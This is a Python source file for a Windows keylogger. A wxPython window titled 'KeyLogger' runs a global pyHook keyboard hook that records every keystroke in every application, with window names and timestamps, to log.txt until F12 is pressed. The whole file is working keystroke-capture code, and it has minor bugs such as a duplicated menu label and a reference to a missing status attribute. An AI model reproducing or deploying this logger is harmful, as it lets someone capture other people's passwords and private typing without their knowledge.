from __future__ import print_function
import pythoncom
import pyHook
import time
import win32api
import wx
import threading

APP_EXIT = 0
APP_PLAY = 1
APP_PAUSE = 2
APP_STOP = 3

appname = ''
asciistr = ''
keystr = ''

class KeyTrackThread(threading.Thread):
    def run(self):
        hm = pyHook.HookManager()
        hm.KeyDown = onKeyboardEvent
        hm.HookKeyboard()
        pythoncom.PumpMessages()
        

class Application(wx.Frame):
    def __init__(self, *args, **kwargs):
        super(Application, self).__init__(*args, **kwargs)
        self.InitUI()

    def InitUI(self):
        menubar = wx.MenuBar()
        fileMenu = wx.Menu()
        viewMenu = wx.Menu()
        runMenu = wx.Menu()
        
        #file menu setting
        fileMenu.Append(wx.ID_NEW, '&New')
        fileMenu.Append(wx.ID_OPEN, '&Open')
        fileMenu.Append(wx.ID_SAVE, '&Save')
        fileMenu.AppendSeparator()
        imp = wx.Menu()
        imp.Append(wx.ID_ANY, 'Importing log')
        fileMenu.AppendMenu(wx.ID_ANY, '&Import', imp)
        fileMenu.Append(APP_EXIT, '&Quit')
        self.Bind(wx.EVT_MENU, self.OnQuit, id=APP_EXIT)
        
        #view menu setting
        self.shst = viewMenu.Append(wx.ID_ANY, 'show statusbar', 'Show Statusbar', kind=wx.ITEM_CHECK)
        self.shtl = viewMenu.Append(wx.ID_ANY, 'show statusbar', 'Show Statusbar', kind=wx.ITEM_CHECK)
        viewMenu.Check(self.shst.GetId(), True)
        viewMenu.Check(self.shtl.GetId(), True)
        self.Bind(wx.EVT_MENU, self.ToggleStatusBar, self.shst)
        self.Bind(wx.EVT_MENU, self.ToggleToolBar, self.shtl)
        
        #run menu setting
        playitem = wx.MenuItem(runMenu, APP_PLAY, '&Play')
        playitem.SetBitmap(wx.Bitmap('bijou\Play.png'))
        pauseitem = wx.MenuItem(runMenu, APP_PAUSE, '&Pause')
        pauseitem.SetBitmap(wx.Bitmap('bijou\Pause.png'))
        stopitem = wx.MenuItem(runMenu, APP_STOP, '&Stop')
        stopitem.SetBitmap(wx.Bitmap('bijou\Cross.png'))
        runMenu.AppendItem(playitem)
        runMenu.AppendItem(pauseitem)
        runMenu.AppendItem(stopitem)

        #menubar setting
        menubar.Append(fileMenu, '&File')
        menubar.Append(viewMenu, '&View')
        menubar.Append(runMenu, '&Run')
        self.SetMenuBar(menubar)

        #status bar setting
        self.statusbar = self.CreateStatusBar()
        self.statusbar.SetStatusText('Ready')

        #tool bar setting
        self.toolbar = self.CreateToolBar()
        self.toolbar.AddLabelTool(APP_PLAY, '', wx.Bitmap('bijou\Play.png'))
        self.toolbar.AddLabelTool(APP_PAUSE, '', wx.Bitmap('bijou\Pause.png'))
        self.toolbar.AddLabelTool(APP_STOP, '', wx.Bitmap('bijou\Cross.png'))
        self.toolbar.Realize()
        
        self.SetSize((600, 400))
        self.SetTitle('KeyLogger')
        self.Centre()
        self.Show(True)

    def ToggleStatusBar(self, e):
        if self.shst.IsChecked():
            self.statusbar.Show()
        else:
            self.status.Hide()

    def ToggleToolBar(self, e):
        if self.shtl.IsChecked():
            self.toolbar.Show()
        else:
            self.toolbar.Hide()
    
    def OnQuit(self, e):
        self.Close()

def onKeyboardEvent(event):
    global appname, asciistr, keystr
    filename = "log.txt"
    file = open(filename, 'a')
    if appname == str(event.WindowName):
        asciistr = asciistr + chr(event.Ascii)
        keystr = keystr + str(event.Key)
    else:
        if asciistr == '' and keystr == '':
            file.writelines("MessageName:%s\n" % str(event.MessageName))
            file.writelines("Message:%s\n" % event.Message)
            file.writelines("Time:%s\n" % time.strftime('%Y-%m-%d %H:%M:%S', time.localtime()))
            file.writelines("------------------------\n")
        else:
            file.writelines("WindowName:%s\n" % appname)
            file.writelines("Time:%s\n" % time.strftime('%Y-%m-%d %H:%M:%S', time.localtime()))
            file.writelines("Ascii_char:%s\n" % asciistr)
            file.writelines("Key_char:%s\n" % keystr)
            file.writelines("------------------------\n")
        appname = str(event.WindowName)
        asciistr = chr(event.Ascii)
        keystr = str(event.Key)
    if str(event.Key) == 'F12':
        file.writelines("WindowName:%s\n" % appname)
        file.writelines("Time:%s\n" % time.strftime('%Y-%m-%d %H:%M:%S', time.localtime()))
        file.writelines("Ascii_char:%s\n" % asciistr)
        file.writelines("Key_char:%s\n" % keystr)
        file.close()
        win32api.PostQuitMessage()
    return True

def main():
    KeyTrackThread().start()
    app = wx.App()
    Application(None)
    app.MainLoop()
    
if __name__ == "__main__":
    main()
